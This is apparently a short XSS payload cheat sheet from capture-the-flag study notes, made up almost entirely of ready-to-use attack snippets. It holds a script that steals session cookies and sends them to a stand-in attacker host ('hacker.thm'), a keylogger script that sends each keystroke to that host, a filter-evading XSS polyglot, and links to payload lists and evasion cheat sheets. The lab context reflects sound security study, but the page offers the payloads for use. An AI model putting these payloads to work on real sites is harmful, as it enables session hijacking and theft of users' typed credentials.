
- steal cookies:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

- key logger:  
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

```


- blind xss: [https://github.com/mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
- XSS polyglots:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

- [XSS Payload list](https://github.com/payloadbox/xss-payload-list)
- [Filter evasion cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Tiny XSS payload](https://github.com/terjanq/Tiny-XSS-Payloads)
- https://labs.withsecure.com/publications/getting-real-with-xss 
- 
